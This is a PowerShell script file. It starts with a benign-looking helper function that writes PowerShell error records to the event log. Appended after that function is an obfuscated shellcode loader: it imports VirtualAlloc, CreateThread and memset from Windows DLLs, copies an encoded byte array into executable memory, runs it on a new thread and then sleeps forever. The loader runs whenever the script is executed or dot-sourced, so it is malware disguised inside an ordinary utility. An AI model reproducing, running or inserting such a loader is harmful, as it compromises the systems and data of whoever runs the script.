

function Write-PPErrorEventLog{



	param(        
        [Parameter(Mandatory=$false)]
		[string]$Message,
        
        [Parameter(Mandatory=$false)]
		[string]$Source,
		
		[switch]
		$ClearErrorVariable  
	)
	
	
	
	
    if($Error){
        $Error | %{$ErrorLog += "$($_.ToString()) $($_.InvocationInfo.PositionMessage) `n`n"}
        
        if($Message){$ErrorLog = "$Message `n`n" + $ErrorLog}
        
        if($ClearErrorVariable){$Error.clear()}
        
        Write-PPEventLog -Message $ErrorLog -Source $Source -EntryType Error -WriteMessage
    }
}
$BjgO = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BjgO -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x16,0xa8,0xb3,0xa3,0xdb,0xdc,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x58,0x13,0x03,0x58,0x13,0x83,0xe8,0xea,0x4a,0x46,0x5f,0xfa,0x09,0xa9,0xa0,0xfa,0x6d,0x23,0x45,0xcb,0xad,0x57,0x0d,0x7b,0x1e,0x13,0x43,0x77,0xd5,0x71,0x70,0x0c,0x9b,0x5d,0x77,0xa5,0x16,0xb8,0xb6,0x36,0x0a,0xf8,0xd9,0xb4,0x51,0x2d,0x3a,0x85,0x99,0x20,0x3b,0xc2,0xc4,0xc9,0x69,0x9b,0x83,0x7c,0x9e,0xa8,0xde,0xbc,0x15,0xe2,0xcf,0xc4,0xca,0xb2,0xee,0xe5,0x5c,0xc9,0xa8,0x25,0x5e,0x1e,0xc1,0x6f,0x78,0x43,0xec,0x26,0xf3,0xb7,0x9a,0xb8,0xd5,0x86,0x63,0x16,0x18,0x27,0x96,0x66,0x5c,0x8f,0x49,0x1d,0x94,0xec,0xf4,0x26,0x63,0x8f,0x22,0xa2,0x70,0x37,0xa0,0x14,0x5d,0xc6,0x65,0xc2,0x16,0xc4,0xc2,0x80,0x71,0xc8,0xd5,0x45,0x0a,0xf4,0x5e,0x68,0xdd,0x7d,0x24,0x4f,0xf9,0x26,0xfe,0xee,0x58,0x82,0x51,0x0e,0xba,0x6d,0x0d,0xaa,0xb0,0x83,0x5a,0xc7,0x9a,0xcb,0xaf,0xea,0x24,0x0b,0xb8,0x7d,0x56,0x39,0x67,0xd6,0xf0,0x71,0xe0,0xf0,0x07,0x76,0xdb,0x45,0x97,0x89,0xe4,0xb5,0xb1,0x4d,0xb0,0xe5,0xa9,0x64,0xb9,0x6d,0x2a,0x89,0x6c,0x1b,0x2f,0x1d,0xa1,0xd1,0x1c,0xec,0xd5,0xeb,0x62,0x07,0x35,0x65,0x84,0x47,0x69,0x25,0x19,0x27,0xd9,0x85,0xc9,0xcf,0x33,0x0a,0x35,0xef,0x3b,0xc0,0x5e,0x85,0xd3,0xbd,0x37,0x31,0x4d,0xe4,0xcc,0xa0,0x92,0x32,0xa9,0xe2,0x19,0xb1,0x4d,0xac,0xe9,0xbc,0x5d,0x58,0x1a,0x8b,0x3c,0xce,0x25,0x21,0x2a,0xee,0xb3,0xce,0xfd,0xb9,0x2b,0xcd,0xd8,0x8d,0xf3,0x2e,0x0f,0x86,0x3a,0xbb,0xf0,0xf0,0x42,0x2b,0xf1,0x00,0x15,0x21,0xf1,0x68,0xc1,0x11,0xa2,0x8d,0x0e,0x8c,0xd6,0x1e,0x9b,0x2f,0x8f,0xf3,0x0c,0x58,0x2d,0x2a,0x7a,0xc7,0xce,0x19,0x7a,0x3b,0x19,0x67,0x08,0x55,0x99;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$V8P=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($V8P.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$V8P,0,0,0);for (;;){Start-sleep 60};

